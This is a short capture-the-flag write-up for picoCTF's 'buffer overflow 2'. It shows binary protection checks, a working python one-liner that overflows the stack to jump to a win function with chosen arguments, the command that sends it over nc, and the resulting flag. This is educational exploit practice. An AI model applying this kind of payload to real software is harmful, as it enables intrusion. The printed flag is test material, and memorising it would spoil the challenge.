# BUFFER OVERFLOW 2

- You can refer this file [link](/picoCTF/buffer_overflow_2/challenge_files/vuln.c) to understand how this payload works.

- This program is 32-bit and has no PIE, so I can take the address of `win` and overwrite it to the `ret` of `vuln()` with fake ret and argument.

```
λ ~/bof_2/ file vuln

vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=1c57f0cbd109ed51024baf11930a5364186c28df, for GNU/Linux 3.2.0, not stripped

λ ~/bof_2/ checksec vuln

[*] '~/bof_2/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## EXPLOIT

```
 python2 -c 'print("a"*112 + "\x96\x92\x04\x08" + "aaaa" + "\x0d\xf0\xfe\xca" + "\x0d\xf0\x0d\xf0")' | nc saturn.picoctf.net 54640
```

```
λ /mnt/c/Users/Whatd/Desktop/CTF/pwn/CTF_practice/picoCTF/SOLVED/bof_2/ python2 -c 'print("a"*112 + "\x96\x92\x04\x08" + "aaaa" + "\x0d\xf0\xfe\xca" + "\x0d\xf0\x0d\xf0")' | nc saturn.picoctf.net 54640
Please enter your string:
���aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��aaaa
picoCTF{argum3nt5_4_d4yZ_31432deb}
```
